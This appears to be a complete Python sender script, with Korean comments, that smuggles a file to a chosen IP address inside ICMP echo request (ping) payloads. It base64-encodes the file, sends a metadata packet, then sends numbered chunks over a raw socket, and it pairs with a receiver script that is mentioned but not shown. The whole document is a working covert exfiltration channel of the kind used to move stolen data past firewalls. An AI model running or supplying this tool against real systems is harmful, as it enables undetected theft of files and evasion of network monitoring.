import socket
import struct
import os
import base64
import time
import sys

# 체크섬 계산
def checksum(data):
    if len(data) % 2:
        data += b'\x00'
    s = sum((data[i] << 8) + data[i+1] for i in range(0, len(data), 2))
    while s >> 16:
        s = (s & 0xFFFF) + (s >> 16)
    return ~s & 0xFFFF

# 송신코드
def send_icmp_echo(dst_ip, payload: bytes, identifier: int, seq_num: int):
    sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)

    icmp_type = 8  # Echo Request
    icmp_code = 0
    icmp_checksum = 0

    header = struct.pack('!BBHHH', icmp_type, icmp_code, icmp_checksum, identifier, seq_num)
    packet_without_checksum = header + payload
    icmp_checksum = checksum(packet_without_checksum)

    header = struct.pack('!BBHHH', icmp_type, icmp_code, icmp_checksum, identifier, seq_num)
    packet = header + payload

    sock.sendto(packet, (dst_ip, 1))
    print(f"Sent {seq_num} ({len(payload)} bytes)")

# 청크로 나눠 전송하는 부분(인코딩 후 나눠서 전송)
def send_file_via_icmp(dst_ip, file_path, chunk_size=512, delay=0.1):
    identifier = os.getpid() & 0xFFFF
    filename = os.path.basename(file_path)

    with open(file_path, 'rb') as f:
        file_data = f.read()
    b64_data = base64.b64encode(file_data)
    total_chunk = (len(b64_data) + chunk_size - 1) // chunk_size

    # META 형식(seq==0 일때로 분기-수신자코드에서)
    meta_msg = f"{filename}::{total_chunk}".encode()
    send_icmp_echo(dst_ip, meta_msg, identifier, 0)
    time.sleep(delay)

    seq = 1
    for i in range(0, len(b64_data), chunk_size):
        chunk = b64_data[i:i+chunk_size]
        formatted_chunk = f"{seq}::{chunk.decode()}".encode()
        send_icmp_echo(dst_ip, formatted_chunk, identifier, seq)
        seq += 1
        time.sleep(delay)

    # print(f"Done. Sent {seq} packets (1 META + {seq - 1} data).") 디버깅용
    print(f"Done.")

if __name__ == "__main__":
    if len(sys.argv)<4:
        print(f"USAGE: {sys.argv[0]} <ip> <file> <chunk_size(768)>")
        sys.exit(-1)

    dst_ip = sys.argv[1]
    file_path = sys.argv[2]
    chunk_size_input = sys.argv[3]

    try:
        chunk_size = int(chunk_size_input)
        if chunk_size <= 0:
            raise ValueError
    except ValueError:
        print("Int error.")
        exit(1)

    if not os.path.isfile(file_path):
        print(f"Missing file path: {file_path}")
        exit(1)

    send_file_via_icmp(dst_ip, file_path, chunk_size=chunk_size)

